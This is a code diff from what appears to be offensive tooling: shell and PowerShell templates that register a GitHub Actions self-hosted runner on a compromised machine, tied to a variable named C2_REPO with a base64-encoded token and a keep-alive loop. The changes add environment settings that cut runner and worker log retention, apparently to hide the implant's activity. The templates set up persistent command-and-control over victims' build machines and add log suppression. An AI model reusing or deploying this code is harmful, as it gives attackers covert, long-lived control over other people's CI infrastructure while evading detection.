@@ -48,7 +48,8 @@ jobs:
 REG_TOKEN=`echo "{0}" | base64 -d`
 C2_REPO={1}
 KEEP_ALIVE={4}
-
+export WORKER_LOGRETENTION=1
+export RUNNER_LOGRETENTION=1
 mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
 curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
 tar xzf ./{2}
@@ -65,6 +66,8 @@ fi
 
     ROR_GIST_WINDOWS = """
 $keep_alive = ${4}
+$env:RUNNER_LOGRETENTION=1
+$env:WORKER_LOGRETENTION=1
 mkdir C:\\.actions-runner1; cd C:\\.actions-runner1
 Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/{3}/{2} -OutFile {2}
 Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD/{2}", "$PWD")
@@ -79,6 +82,8 @@ REG_TOKEN=`echo "{0}" | base64 -d`
 C2_REPO={1}
 KEEP_ALIVE={4}
 
+export WORKER_LOGRETENTION=1
+export RUNNER_LOGRETENTION=1
 mkdir -p $HOME/runner/.actions-runner/ && cd $HOME/runner/.actions-runner/
 curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
 tar xzf ./{2}
